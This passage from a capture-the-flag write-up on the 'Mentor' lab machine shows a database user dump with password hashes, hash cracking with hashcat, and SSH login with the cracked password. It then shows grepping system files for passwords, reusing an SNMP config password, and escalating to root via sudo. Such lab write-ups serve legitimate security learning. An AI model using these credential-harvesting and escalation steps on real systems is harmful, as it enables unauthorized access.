mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db=# select * from users;
 id |           email            |  username   |             password             
----+----------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb     | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb       | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | foo@bar.com                | foobar      | 6df23dc03f9b54cc38a0fc1483df6e21
  5 | james@foo.bar              | james       | 6df23dc03f9b54cc38a0fc1483df6e21
  6 | admin@mentorquotes.htb     | admin       | 6df23dc03f9b54cc38a0fc1483df6e21
```

A little poking around, and we now have password hashes for existing accounts including our own. After running the `service_acc` account's hash through hashcat, we find password `123meunomeeivani`

```bash
$hashcat 53f22d0dfa10dce7e29cd31f4f953fd8 /usr/share/wordlists/rockyou.txt --show 
53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani
```

And we're able to SSH in as `svc@mentorquotes.htb`:

```bash
$sshpass -p 123meunomeeivani ssh svc@mentorquotes.htb
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb 19 10:21:25 AM UTC 2023

  System load:                      0.2568359375
  Usage of /:                       65.2% of 8.09GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        490
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.193
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:14cc

  => There are 237 zombie processes.


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Feb 19 10:20:23 2023 from 10.10.14.33
svc@mentor:~$ cat user.txt 
aa7da69a22677e9f78e4cfcc8d213108
```

So we have the same user flag which is bind mounted into the container the web application runs in -- which is not terribly exciting.  But at least we've escaped out of lightweight container hell and can at least look at privesc to root on the host.

The active users on the machine are as follows, which we obtain by grepping `/etc/passwd` and filtering out invalid login shells:

```bash
svc@mentor:/dev/shm$ grep -vE '/usr/sbin/nologin|/bin/false' /etc/passwd
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
svc:x:1001:1001:,,,:/home/svc:/bin/bash
james:x:1000:1000:,,,:/home/james:/bin/bash
```

Ideally we want root -- but maybe we can privesc via the james user?  I ran [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) but didn't see much that stood out.

I floundered a little with some more enumeration, and decided to start grepping the filesystem for sensitive things. Next I grepped the filesystem for 'pass':

```bash
svc@mentor:/dev/shm$ grep -irn pass /etc 2> /dev/null
/etc/snmp/snmpd.conf:78:# createUser username (MD5|SHA|SHA-512|SHA-384|SHA-256|SHA-224) authpassphrase [DES|AES] [privpassphrase]
/etc/snmp/snmpd.conf:92:createUser bootstrap MD5 SuperSecurePassword123__ DES
```

Let's try `su` as james with the password `SuperSecurePassword123__`

```bash
svc@mentor:/dev/shm$ su james
Password: 
james@mentor:~$ sudo -l
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
james@mentor:~$ sudo /bin/sh
# ls /root
logins.log  root.txt  scripts  snap
# cat /root/root.txt
1f508ff3a36988138861bde0e30f4c0f
```

So we were able to `su` as james, and as `sudo -l` shows, this account can run `/bin/sh` as root.

And that's it -- we have the root flag!

## Conclusion

This machine was a little bit of an oddball: SNMP and a flaky web server that I was unable to enumerate initially both resulted in a substantial amount of time lost.

I've used SNMP within both my home lab and working for an MSP before (configuring remote management software), but did not expect to have issues enumerating community strings until I found one tool that worked with SNMPv2.

Apart from these two hiccups, the only other challenge was tunnelling the postgres connection -- and 0xdf's quick cheatsheet was very useful here.  Another more tedious option would be to write a custom python script to run from within the container, connecting to the Postgres instance and dumping tables.

Otherwise, the machine was fairly straight forward mostly requiring enumerating APIs trying to get an admin JWT in order to further enumerate authorized APIs followed by basic command injection into a backup endpoint that was easily testable before being used to gain a reverse shell.

I'm looking forward to more challenges where tunnelling, pivoting, etc are involved across a larger lab simulating a proper network -- and interested to see what other tooling exists in this area.

What did I learn here?  Well, different versions of SNMP will enumerate differently on the same device -- given different community strings.  Also, sometimes machines are just unreliable, which is easily forgiven.  After gaining a foothold and seeing evidence of other people's reverse shells, scripts, etc -- you begin to realise how much traffic these VMs are taking which affects how (un-)responsive they are.

The main take away? Regular breaks, and revisit challenges with fresh eyes.  Often time heals -- both physiologically (sleep!) and a reboot will restore services.  It can be difficult knowing whether you're not enumerating fully, or if a machine's services are just unresponsive.
